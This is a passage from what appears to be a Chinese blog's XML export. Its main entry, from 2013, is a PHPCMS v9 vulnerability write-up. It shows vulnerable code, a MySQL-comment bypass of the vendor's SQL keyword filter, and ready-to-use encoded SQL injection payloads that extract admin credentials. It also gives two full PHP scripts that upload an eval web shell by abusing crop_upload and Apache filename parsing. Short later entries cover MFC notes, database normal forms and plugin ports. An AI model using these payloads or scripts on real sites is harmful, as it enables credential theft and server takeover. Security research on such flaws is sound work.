true;&quot;&gt;/phpcms/modules/member/index.php public function account_manage_info() { if(isset($_POST[’dosubmit’])) { //更新用户昵称 $nickname = isset($_POST[’nickname’]) &amp;amp;&amp;amp; trim($_POST[’nickname’]) ? trim($_POST[’nickname’]) : ’’; if($nickname) { $this-&amp;gt;db-&amp;gt;update(array(’nickname’=&amp;gt;$nickname), array(’userid’=&amp;gt;$this-&amp;gt;memberinfo[’userid’])); if(!isset($cookietime)) { $get_cookietime = param::get_cookie(’cookietime’); } $_cookietime = $cookietime ? intval($cookietime) : ($get_cookietime ? $get_cookietime : 0); $cookietime = $_cookietime ? TIME + $_cookietime : 0; param::set_cookie(’_nickname’, $nickname, $cookietime); } require_once CACHE_MODEL_PATH.’member_input.class.php’; require_once CACHE_MODEL_PATH.’member_update.class.php’; $member_input = new member_input($this-&amp;gt;memberinfo[’modelid’]); $modelinfo = $member_input-&amp;gt;get($_POST[’info’]);//数据传入get函数，经过get函数对注入语句无影响 $this-&amp;gt;db-&amp;gt;set_model($this-&amp;gt;memberinfo[’modelid’]); $membermodelinfo = $this-&amp;gt;db-&amp;gt;get_one(array(’userid’=&amp;gt;$this-&amp;gt;memberinfo[’userid’])); if(!empty($membermodelinfo)) { $this-&amp;gt;db-&amp;gt;update($modelinfo, array(’userid’=&amp;gt;$this-&amp;gt;memberinfo[’userid’])); //进入sql语句形成注入 } else { $modelinfo[’userid’] = $this-&amp;gt;memberinfo[’userid’]; $this-&amp;gt;db-&amp;gt;insert($modelinfo); } Mysql.class.php文件 public function update($data, $table, $where = ’’) { if($table == ’’ or $where == ’’) { return false; } $where = ’ WHERE ’.$where; $field = ’’; if(is_string($data) &amp;amp;&amp;amp; $data != ’’) { $field = $data; } elseif (is_array($data) &amp;amp;&amp;amp; count($data) &amp;gt; 0) { $fields = array(); foreach($data as $k=&amp;gt;$v) { switch (substr($v, 0, 2)) { case ’+=’: $v = substr($v,2); if (is_numeric($v)) { $fields[] =$this-&amp;gt;add_special_char($k).’=’.$this-&amp;gt;add_special_char($k).’+’.$this-&amp;gt;escape_string($v, ’’, false); } else { continue; } break; case ’-=’: $v = substr($v,2); if (is_numeric($v)) { $fields[] =$this-&amp;gt;add_special_char($k).’=’.$this-&amp;gt;add_special_char($k).’-’.$this-&amp;gt;escape_string($v, ’’, false); } else {continue;} break; default: $fields[] = $this-&amp;gt;add_special_char($k).’=’.$this-&amp;gt;escape_string($v); } } $field = implode(’,’, $fields); } else { return false; } $sql = ’UPDATE’.$this-&gt;config[’database’].’.’.$table.’SET ’.$field.$where; return $this-&amp;gt;execute($sql); }&lt;/pre&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;可以清楚的看出又是使用的&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;add_special_char&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;函数过滤哦。所以其实这两个注入都是利用的程序设计的同一个&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;bug&lt;span style=&quot;font-family:宋体;&quot;&gt;。&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;0x02&amp;nbsp;&lt;span style=&quot;font-family:宋体;&quot;&gt;绕过厂商的补丁&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-weight:bold;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;span style=&quot;mso-spacerun:’yes’;font-size:10.5000pt;font-family:’宋体’;&quot;&gt;当让漏洞被发现者上报&lt;span style=&quot;font-family:’Times New Roman’;&quot;&gt;wooyun&lt;/span&gt;&lt;span style=&quot;font-family:宋体;&quot;&gt;后厂商也做了相应的补丁，厂商也找到了漏洞的根源也就是：&lt;/span&gt;&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:’Times New Roman’;&quot;&gt;public&amp;nbsp;function&amp;nbsp;add_special_char(&amp;amp;$value)&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;函数&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;。&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;补丁后函数如下：&lt;/span&gt;&lt;span style=&quot;font-size:10.5pt;font-family:宋体;&quot;&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;/span&gt; &lt;pre class=&quot;brush:php; toolbar: true; auto-links: true;&quot;&gt;public function add_special_char(&amp;amp;$value) { if(’&amp;#42’ == $value || false !== strpos($value, ’(’) || false !== strpos($value, ’.’) || false !== strpos ( $value, ’’)) { //不处理包含&amp;#42 或者 使用了sql方法。 } else { $value = ’’.trim($value).’’; } if (preg_match(“/(select|insert|update|delete)/i”, $value)) { $value = preg_replace(“/(select|insert|update|delete)/i”, ’’, $value); } return $value; }&lt;o:p&gt;&lt;/o:p&gt;很明显厂商直接做了过滤：&lt;o:p&gt;&lt;/o:p&gt;$value&nbsp;=&nbsp;preg_replace(“/(select|insert|update|delete)/i”,&nbsp;’’,&nbsp;$value);&lt;o:p&gt;&lt;/o:p&gt;看着这个可能有人会猜测selselectect是不是可以绕过呢，答案是否的。大家可以看到有个，这个为整词匹配，也就是说如果你是selselectect，这个为一个完整的词，用这个完整的词去匹配，不会单独拿这个词的一部分去匹配，因此经过匹配仍然是selselecctect。&lt;o:p&gt;&lt;/o:p&gt;那我们怎么绕过呢？&lt;o:p&gt;&lt;/o:p&gt;/&amp;#42!50000select&amp;#42/这个就是答案了，首先作为一个整词50000select是不会被正则掉的，其次使用/&amp;#42!&amp;#42/这个特殊的mysql的特性使得select的作用不变，完整的绕过了补丁。&lt;o:p&gt;&lt;/o:p&gt;从上文提到的两个注入可以看出这个过滤函数是非常重要的，如果这个过滤函数被绕过了，注入漏洞也许不止上文中的两个吧！&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x03&nbsp;破不开的密码&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;上文提到了注入，我们也只是得到了当前的数据库操作权限（数据库权限大，可以跨库之类的就另当别论了）。&lt;o:p&gt;&lt;/o:p&gt;当然我们有了注入读取管理员进入后台，然后后台getwebshell这个是一般思路，但是phpcms&nbsp;v9的加密是加有salt的和dz加密一样，使之破解难度非常大。以前写过一个php破解脚本，单线程效率灰常低，有兴趣了可以看下。 &lt;o:p&gt;&lt;/o:p&gt;http://lanu.sinaapp.com/PHP_study/89.html&lt;o:p&gt;&lt;/o:p&gt;密码破不开只能看看有没有什么前台getwebshell之类的了。&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x04&nbsp;曾经的getwebshell&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;漏洞文件：phpcmsmodulesattachmentattachments.php&lt;o:p&gt;&lt;/o:p&gt;漏洞函数：crop_upload&lt;o:p&gt;&lt;/o:p&gt;if (isset($GLOBALS[“HTTP_RAW_POST_DATA”])) {$pic = $GLOBALS[“HTTP_RAW_POST_DATA”];//这里可以得知，图片内容由POST控制//中间省略十万行if (strpos($_GET[’file’], pc_base::load_config(’system’, ’upload_url’))!==false) {$file = $GET[’file’];$basename = basename($file);if (strpos($basename, ’thumb’)!==false) {$file_arr = explode(’_’, $basename);$basename = array_pop($file_arr);}$new_file = ’thumb_’.$width.’’.$height.’’.$basename;}//中间省略十万行&lt;o:p&gt;&lt;/o:p&gt;file_put_contents($this-&gt;upload_path.$filepath.$new_file,&nbsp;$pic);&lt;o:p&gt;&lt;/o:p&gt;//上面可见，文件名$basename可控，图片内容可控，还有什么不能做？？&lt;o:p&gt;&lt;/o:p&gt;}&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;上面这段代码是截取wooyun上的，时间太久了没有找到当时漏洞版本的程序。&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;网上也有相应的exp：&lt;o:p&gt;&lt;/o:p&gt;&lt;?phperror_reporting(E_ERROR);set_time_limit(0);$pass=”wooyun.in”;print_r(’+—————————————————————————+PHPCms V9 GETSHELL 0DAYc0de by testr00ttest针对iis6.0的漏洞 有点鸡肋 但是也可以用apache 是老版本可能会产生问题+—————————————————————————+’);echo ’密码为’.$pass;if ($argc &lt; 2) {print_r(’+—————————————————————————+Usage: php ’.$argv[0].’ url [js]js 类型配置 1为asp 2为php 3为apache 的版本Example:php ’.$argv[0].’ www.wooyun.in 1+—————————————————————————+’);exit;}$url=$argv[1];$js=$argv[2];//写入脚本类型 wooyun.in$phpshell=’&lt;?php @eval($_POST[’’.$pass.’’]);?&gt;’;$aspshell=’&lt;%eval request(“’.$pass.’”)%&gt;’;if($js==1){ $file=”1.asp;1.jpg”; $ret=GetShell($url,$aspshell,$file);}else if($js==2){ $file=”1.php;1.jpg”; $ret=GetShell($url,$phpshell,$file);}else if($js==3){ $file=”1.php.jpg”; $ret=GetShell($url,$phpshell,$file);}else{ print_r(’没有选择脚本类型’);}$pattern = “|http://[^,]+?.jpg,?|U”;preg_match_all($pattern, $ret, $matches);if($matches[0][0]){ echo “url地址:”.$matches[0][0];}else{ echo “没得到！”;}function GetShell($url,$shell,$js){ $content =$shell; $data = “POST /index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=1&amp;height=1&amp;file=http://“.$url.”/uploadfile/“.$js.” HTTP/1.1“; $data .= “Host: “.$url.”“; $data .= “User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1“; $data .= “Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&amp;#42/&#42;q=0.8“; $data .= “Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3“; $data .= “Connection: close“; $data .= “Content-Length: “.strlen($content).”“; $data .= $content.”“; //echo $data; $ock=fsockopen($url,80); if (!$ock) { echo “ No response from “.$url.”“; } fwrite($ock,$data); $resp = ’’; while (!feof($ock)) { $resp.=fread($ock, 1024); } return $resp;}?&gt;&lt;o:p&gt;&lt;/o:p&gt;可以看出基本都是利用的web容器的解析漏洞，时间过了这么久了，厂商补丁应该是打上了。&lt;o:p&gt;&lt;/o:p&gt;我在最新的phpcms中使用这个exp，没有成功。&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x05&nbsp;补漏了apache&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;补丁已打，但却依然不是那么完善。&lt;o:p&gt;&lt;/o:p&gt;最新程序： &lt;o:p&gt;&lt;/o:p&gt;public function crop_upload() {if (isset($GLOBALS[“HTTP_RAW_POST_DATA”])) {$pic = $GLOBALS[“HTTP_RAW_POST_DATA”];if (isset($_GET[’width’]) &amp;&amp; !empty($_GET[’width’])) {$width = intval($_GET[’width’]);}if (isset($_GET[’height’]) &amp;&amp; !empty($_GET[’height’])) {$height = intval($_GET[’height’]);}if (isset($_GET[’file’]) &amp;&amp; !empty($_GET[’file’])) {$_GET[’file’] = str_replace(’;’,’’,$_GET[’file’]);//过滤了fen号if(is_image($_GET[’file’])== false || strpos($_GET[’file’],’.php’)!==false) exit();//is_image()检测是个关键if (strpos($_GET[’file’], pc_base::load_config(’system’, ’upload_url’))!==false) {$file = $GET[’file’];$basename = basename($file);//获取带有后缀的文件名if (strpos($basename, ’thumb’)!==false) {$file_arr = explode(’_’, $basename);$basename = array_pop($file_arr);}$new_file = ’thumb_’.$width.’’.$height.’’.$basename;} else {pc_base::load_sys_class(’attachment’,’’,0);$module = trim($_GET[’module’]);$catid = intval($_GET[’catid’]);$siteid = $this-&gt;get_siteid();$attachment = new attachment($module, $catid, $siteid);$uploadedfile[’filename’] = basename($_GET[’file’]);$uploadedfile[’fileext’] = fileext($_GET[’file’]);if (in_array($uploadedfile[’fileext’], array(’jpg’, ’gif’, ’jpeg’, ’png’, ’bmp’))) {$uploadedfile[’isimage’] = 1;}$file_path = $this-&gt;upload_path.date(’Y/md/’);pc_base::load_sys_func(’dir’);dir_create($file_path);$new_file = date(’Ymdhis’).rand(100, 999).’.’.$uploadedfile[’fileext’];$uploadedfile[’filepath’] = date(’Y/md/’).$new_file;$aid = $attachment-&gt;add($uploadedfile);}$filepath = date(’Y/md/’);file_put_contents($this-&gt;upload_path.$filepath.$new_file, $pic);} else {return false;}echo pc_base::load_config(’system’, ’upload_url’).$filepath.$new_file;exit;}}&lt;o:p&gt;&lt;/o:p&gt;后缀检测：&lt;o:p&gt;&lt;/o:p&gt;phpcmsmodulesattachmentfunctionsglobal.func.phpfunction is_image($file) {$ext_arr = array(’jpg’,’gif’,’png’,’bmp’,’jpeg’,’tiff’);$ext = fileext($file);关键地方return in_array($ext,$ext_arr) ? $ext_arr :false;}&lt;o:p&gt;&lt;/o:p&gt;关键函数:&lt;o:p&gt;&lt;/o:p&gt;function fileext($filename) {return strtolower(trim(substr(strrchr($filename, ’.’), 1, 10)));}Fileext函数是对文件后缀名的提取。&lt;o:p&gt;&lt;/o:p&gt;根据此函数我们如果上传文件名为ddd.Php.jpg%20%20%20%20%20%20%20Php&lt;o:p&gt;&lt;/o:p&gt;经过此函数提取到的后缀还是jpg，因此正在is_image()函数中后缀检测被绕过了。&lt;o:p&gt;&lt;/o:p&gt;我们回到public&nbsp;function&nbsp;crop_upload()&nbsp;函数中&lt;o:p&gt;&lt;/o:p&gt;if(is_image($_GET[’file’])== false || strpos($_GET[’file’],’.php’)!==false) exit();在经过了is_image的判断之后又来了个.php的判断，在此程序员使用的是strpos函数&lt;o:p&gt;&lt;/o:p&gt;这个函数是对大小写敏感的函数我们使用.Php就可以直接绕过了。&lt;o:p&gt;&lt;/o:p&gt;经过上边的两层的过滤我们的ddd.Php.jpg%20%20%20%20%20%20%20Php后缀依然有效。&lt;o:p&gt;&lt;/o:p&gt;最后$basename变量的值就为ddd.Php.jpg%20%20%20%20%20%20%20Php&nbsp;然后使用file_put_contents函数写入到了指定目录。&lt;o:p&gt;&lt;/o:p&gt;看见ddd.Php.jpg%20%20%20%20%20%20%20Php这个后缀，大家应该明白了，它用在apache搭建的服务器上可以被解析。&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;0x06&nbsp;Exploit编写&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;1.注入：&lt;o:p&gt;&lt;/o:p&gt;短消息回复注入：&lt;o:p&gt;&lt;/o:p&gt;%60userid%60%29+values%28%28/&amp;#42!50000SeLECT&amp;#42/+1+FROM+%28/&amp;#42!50000SeLECT&amp;#42/+count%28%2a%29%2Cconcat%28floor%28rand%280%29%2a2%29%2C%28substring%28%28/&amp;#42!50000SeLECT&amp;#42/+%28/&amp;#42!50000SeLECT&amp;#42/+concat%280x23%2Ccast%28concat%28username%2C0x3a%2Cpassword%2C0x3a%2Cencrypt%29+as+char%29%2C0x23%29+from+v9_admin+LIMIT++0%2C1%29%29%2C1%2C62%29%29%29a+from+information_schema%2Etables+group+by+a%29b%29%29+%2D%2D+&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;生日修改注入：&lt;o:p&gt;&lt;/o:p&gt;%60userid%60%3D%28/&amp;#42!50000SeLECT&amp;#42/+1+FROM+%28/&amp;#42!50000SeLECT&amp;#42/+count%28%2a%29%2Cconcat%28floor%28rand%280%29%2a2%29%2C%28substring%28%28/&amp;#42!50000SeLECT&amp;#42/+%28/&amp;#42!50000SeLECT&amp;#42/+concat%280x23%2Ccast%28concat%28username%2C0x3a%2Cpassword%2C0x3a%2Cencrypt%29+as+char%29%2C0x23%29+from+v9_admin+LIMIT++0%2C1%29%29%2C1%2C62%29%29%29a+from+information_schema%2Etables+group+by+a%29b%29+%2D%2D+&lt;o:p&gt;&lt;/o:p&gt;2.getshell(apache)&nbsp;&lt;o:p&gt;&lt;/o:p&gt;&lt;?phperror_reporting(E_ERROR);set_time_limit(0);$pass=”ln”;print_r(’+—————————————————————————+PHPCms V9 GETSHELL 0DAYcode by L.N.apache 适用(利用的apache的解析漏洞)+—————————————————————————+’);if ($argc &lt; 2) {print_r(’+—————————————————————————+Usage: php ’.$argv[0].’ url pathExample:1.php ’.$argv[0].’ lanu.sinaapp.com2.php ’.$argv[0].’ lanu.sinaapp.com /phpcms+—————————————————————————+’);exit;}$url = $argv[1];$path = $argv[2];$phpshell = ’&lt;?php @eval($POST[’’.$pass.’’]);?&gt;’;$file = ’1.thumb.Php.JPG%20%20%20%20%20%20%20Php’;if($ret=Create_dir($url,$path)){//echo $ret;$pattern = “|Server:[^,]+?|U”;preg_match_all($pattern, $ret, $matches);if($matches[0][0]){if(strpos($matches[0][0],’Apache’) == false){echo “亲！此网站不是apache的网站。“;exit;}}$ret = GetShell($url,$phpshell,$path,$file);$pattern = “|http://[^,]+?.,?|U”;preg_match_all($pattern, $ret, $matches);if($matches[0][0]){echo ““.’密码为: ’.$pass.”“;echo “url地址: “.$matches[0][0].’JPG%20%20%20%20%20%20%20Php’.”“;exit;}else{$pattern = “|/uploadfile/[^,]+?.,?|U”;preg_match_all($pattern, $ret, $matches);if($matches[0][0]){echo ““.’密码为: ’.$pass.”“;echo “url地址:”.’http://’.$url.$path.$matches[0][0].’JPG%20%20%20%20%20%20%20Php’.”“;exit;}else{echo “没得到！“;exit;}}}function GetShell($url,$shell,$path,$js){ $content =$shell; $data = “POST “.$path.”/index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=6&amp;height=6&amp;file=http://“.$url.$path.”/uploadfile/“.$js.” HTTP/1.1“; $data .= “Host: “.$url.”“; $data .= “User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1“; $data .= “Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&amp;#42/&#42;q=0.8“; $data .= “Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3“; $data .= “Connection: close“; $data .= “Content-Length: “.strlen($content).”“; $data .= $content.”“; $ock=fsockopen($url,80); if (!$ock){ echo ““.”此网站没有回应,检测url是否输入正确”.”“;exit; }else{fwrite($ock,$data);$resp = ’’;while (!feof($ock)){$resp.=fread($ock, 1024);}return $resp;}}function Create_dir($url,$path=’’){ $content =’I love you’; $data = “POST “.$path.”/index.php?m=attachment&amp;c=attachments&amp;a=crop_upload&amp;width=6&amp;height=6&amp;file=http://lanu.sinaapp.com/1.jpg HTTP/1.1“; $data .= “Host: “.$url.”“; $data .= “User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:5.0.1) Gecko/20100101 Firefox/5.0.1“; $data .= “Accept: text/html,application/xhtml+xml,application/xml;q=0.9,&amp;#42/&#42;q=0.8“; $data .= “Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3“; $data .= “Connection: close“; $data .= “Content-Length: “.strlen($content).”“; $data .= $content.”“; $ock=fsockopen($url,80); if (!$ock){ echo ““.”此网站没有回应,检测url是否输入正确”.”“;exit; }fwrite($ock,$data); $resp = ’’; while (!feof($ock)){ $resp.=fread($ock, 1024); }return $resp;}?&gt;&lt;o:p&gt;&lt;/o:p&gt;0x07&nbsp;结束语&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;以上皆是小菜一家之言，&lt;o:p&gt;&lt;/o:p&gt;如有错误希望指正，&lt;o:p&gt;&lt;/o:p&gt;如有建议希望讨论，&lt;o:p&gt;&lt;/o:p&gt;最后祝大家新年快乐。&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;作者：L.N.&nbsp;&nbsp;&amp;&amp;&nbsp;&nbsp;N3w1yB1r7h&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;邮箱：1083243604@qq.com&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;博客：lanu.sinaapp.com&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;时间：2013年2月19日&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;&lt;o:p&gt;&lt;/o:p&gt;]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
      <tags>
        <tag>phpcms</tag>
        <tag>绕过补丁</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[看mfc的笔记]]></title>
    <url>%2F2013%2F02%2F17%2F%E7%9C%8Bmfc%E7%9A%84%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[__try {} __except {} http://hi.baidu.com/niujingqian/item/b7043fd66e1773856cce3fd8 &nbsp; GlobalAlloc http://blog.163.com/chentong1115@126/blog/static/4531473220097121148389/ &nbsp; memset http://www.cnblogs.com/xiaolongchase/archive/2011/10/22/2221326.html &nbsp; CFile http://wpf2006.bokee.com/5820693.html http://topic.okbase.net/200901/2009011410/3548202.html &nbsp; 记录一下]]></content>
      <categories>
        <category>Python|C|C++</category>
      </categories>
      <tags>
        <tag>mfc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[转]关于数据库范式]]></title>
    <url>%2F2013%2F02%2F17%2F%E8%BD%AC-%E5%85%B3%E4%BA%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8C%83%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 今天逛博客，看见《数据库范式总结》http://www.raychase.net/1209，于是乎记录下。 copy如下： 文章系本人原创，转载请保持完整性并注明出自《四火的唠叨》数据库表结构设计时，遵从一定的范式（NF，Noraml Form）可以减少数据冗余和操作异常。第一范式（1NF）1NF指的是每个属性值都是不可再分的。满足1NF的关系被称为规范化的关系，1NF也是关系模式应具备的最起码的条件。比如有这样一张表user的两列： name phone_numberphone_number这一列只存储一个电话号码，如果一条数据同时存储了住宅电话和手机号码，比如：“010-65576558,13765556765”，那么这个属性是可以再分的，违背了1NF。第二范式（2NF）2NF要求去除局部依赖。也就是说，表中的属性完全依赖于全部主键，而不是部分主键。比方说user表包含下面几列： user_id name phone_number job_id job_description其中job_description依赖于job_id，而不是全部主键（user_id，job_id），所以违背了2NF。这时可以把job部分单独抽取成一张job表，去除冗余。第三范式（3NF）3NF要求消除非主属性对候选键的传递依赖。比如user表现在组成如下： user_id name classification仅有user_id是主键，用户姓名依赖于主键user_id，根据姓名name来给用户分类，而用户可能重名，因此name是允许重复的，再有用户分类classification依赖于用户姓名。这张表已经满足了2NF，即属性依赖于全部主键user_id，但是形成了从classification到非候选键name再到主键user_id的传递依赖，不符合3NF。BC范式（BCNF）3NF中只是排除了非主属性对候选键的传递依赖，于是更进一步，BCNF还要求消除主属性对候选键在内的传递依赖。user表现在变成这样： user_id card_id passport_id其中护照号passport_id是主键，身份证号card_id和用户号user_id都是候选键，存在主属性passport_id到card_id再到候选键user_id的传递依赖。第四范式（4NF）4NF是要消除多值依赖。在关系模式中，函数依赖不能表示属性值之间的一对多联系，这些属性之间有些虽然没有直接关系，但存在间接的关系，把没有直接联系、但有间接的联系称为多值依赖的数据依赖。比如user表： user_id position salary_leveluser_id是主键，薪水等级salary_level看似被用户id直接确定，但其实薪水等级是根据职位position来确定的，和用户本身无直接关系，这就是多值依赖。第五范式（5NF）、DK范式（DKNF）和第六范式（6NF）5NF要求消除连接依赖，并且必须保证数据完整。多值依赖是连接依赖的特殊情况，定义稍复杂。这几种范式已经很少涉及。在保证数据完整性基础上，通常达到3NF，有时达到2NF已经足够了，追求过高的NF级别会导致混乱的库表，大量的多表连接查询，性能低下。文章系本人原创，转载请保持完整性并注明出自《四火的唠叨》]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>范式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[emlog的sendmail插件Sae版]]></title>
    <url>%2F2013%2F02%2F07%2Femlog%E7%9A%84sendmail%E6%8F%92%E4%BB%B6Sae%E7%89%88%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 修改的Sae版的sendmail插件。 1.功能 &nbsp; &nbsp; 当日志和碎语有评论时，自动发一封邮件提醒。 &nbsp; &nbsp; 当你回复别人评论时，会自动发一封邮件提醒评论者。 &nbsp; 2.修改 &nbsp; &nbsp; 配置文件读写和我前几个插件思路一样，详情请查看前几个相关插件修改文章 &nbsp; &nbsp; 修改kl_sendmail_do函数：使用了Sae提供的mail类接口 function kl_sendmail_do($mailserver, $port, $mailuser, $mailpass, $mailto, $subject, $content) { //by L.N. $mail = new SaeMail(); $ret = $mail-&gt;quickSend( "$mailto" , "$subject" , "$content" , "$mailuser" , "$mailpass" , "$mailserver" , "$port" ); // 指定smtp和端口 return $ret; } 如果发现bug，请留言。]]></content>
      <categories>
        <category>SAE新浪</category>
      </categories>
      <tags>
        <tag>sae</tag>
        <tag>移植</tag>
        <tag>Sendmail插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[emlog跑马灯公告插件Sae版]]></title>
    <url>%2F2013%2F02%2F07%2Femlog%E8%B7%91%E9%A9%AC%E7%81%AF%E5%85%AC%E5%91%8A%E6%8F%92%E4%BB%B6Sae%E7%89%88%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 今天继续修改博客以前因为移植Sae平台而没法使用的插件，今天移植的是寒川写的一个跑马灯公告。 1.增加了一个修改字体大小的选项 2.思路和前两个插件差不多]]></content>
      <categories>
        <category>SAE新浪</category>
      </categories>
      <tags>
        <tag>sae</tag>
        <tag>移植</tag>
        <tag>跑马灯公告插件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[emlog微博通插件Sae版]]></title>
    <url>%2F2013%2F02%2F06%2Femlog%E5%BE%AE%E5%8D%9A%E9%80%9A%E6%8F%92%E4%BB%B6Sae%E7%89%88%2F</url>
    <content type="text"><![CDATA[&nbsp; &nbsp; 刚好放假有点时间，于是乎把自己博客优化下，emlog移植到Sae平台，虽然基本功能可以使用，但是还是有很多地方移植的不是很好。 &nbsp; &nbsp; 前段时间移植一个微博同步插件，一直不成功，今天跑官网一看，我那个去啊，那个插件api已经失效了，真是悲剧。 &nbsp; &nbsp; 于是乎我重新下载了一个微博通的插件做移植。 &nbsp; &nbsp; 移植的思路和我移植的反垃圾评论思路差不多，具体思路可以参考：http://lanu.sinaapp.com/saecloud/126.html &nbsp; &nbsp; 下面说下我的修改： 1.删除了wbto_config.php和wbto_profile.php两个文件 &nbsp; 2.增加了wbto_kvdb.php文件 &nbsp; &nbsp; 这个文件里面写的是kvdb服务的一些功能函数 &lt;?php // init kvdb at 12:31 2013-2-6 by L.N. begin function wbto_read($key) { $kv = wbto_init_kvdb(); $ret = $kv-&gt;get($key); return $ret; } function wbto_write($data, $key) { $kv = wbto_init_kvdb(); $ret = $kv-&gt;set($key,$data); if($ret !== true) { wbtoMsg("写入数据失败!"); } } function wbto_install() { $kv = wbto_init_kvdb(); $ret = $kv-&gt;add(’WBTO_API_KEY’, ’emlog’); $ret1 = $kv-&gt;add(’WBTO_API_DOMAIN’, ’wbto.cn’); $ret2 = $kv-&gt;add(’WBTO_API_POST_PATH’, ’/api/update.json’); $ret3 = $kv-&gt;add(’WBTO_API_POST_IMAGE_PATH’, ’/api/upload.json’); $ret4 = $kv-&gt;add(’WBTO_USER_NAME’,’test’); $ret5 = $kv-&gt;add(’WBTO_USER_PASSWD’,’123456’); $ret6 = $kv-&gt;add(’WBTO_SYNC’,’1’); $ret7 = $kv-&gt;add(’WBTO_TFROM’,’5’); if($ret !== true &amp;&amp; $ret1 !== true &amp;&amp; $ret2 !== true &amp;&amp; $ret3 !== true &amp;&amp; $ret4 !== true &amp;&amp; $ret5 !== true &amp;&amp; $ret6 !== true &amp;&amp; $ret7 !== true) { wbtoMsg("安装失败!"); } } function wbto_uninstall() { $kv = wbto_init_kvdb(); $ret = $kv-&gt;delete(’WBTO_API_KEY’); $ret1 = $kv-&gt;delete(’WBTO_API_DOMAIN’); $ret2 = $kv-&gt;delete(’WBTO_API_POST_PATH’); $ret3 = 